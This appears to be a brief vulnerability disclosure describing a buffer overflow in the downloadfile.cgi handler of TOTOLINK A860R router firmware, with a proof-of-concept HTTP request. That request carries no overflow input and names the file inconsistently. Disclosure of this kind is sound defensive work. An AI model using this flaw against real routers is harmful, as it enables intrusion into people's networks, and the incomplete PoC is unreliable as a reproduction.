# Firmware:
TOTOLINK:A860R V4.1.2cu.5182_B20201027

http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=62&ids=36
# Detail:
The main function in downloadfile.cgi has a buffer overflow vulnerability

![T_LWMM%YD6U@XS%V7~Y_6 2](https://user-images.githubusercontent.com/84966968/183255048-3cda211d-cb6a-4f95-b7dc-61a088f80824.png)

You can see that the V14 register gets the parameters. Then go through (v3 = STRCHR (V14, '='); After processing, it is copied directly into V25, causing a buffer overflow

# pocï¼š
```
GET /cgi-bin/downloadFlile.cgi? HTTP/1.1 
Host: 192.168.111.12

Accept-Encoding: gzip, deflate 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Cache-Control: max-age=0
```
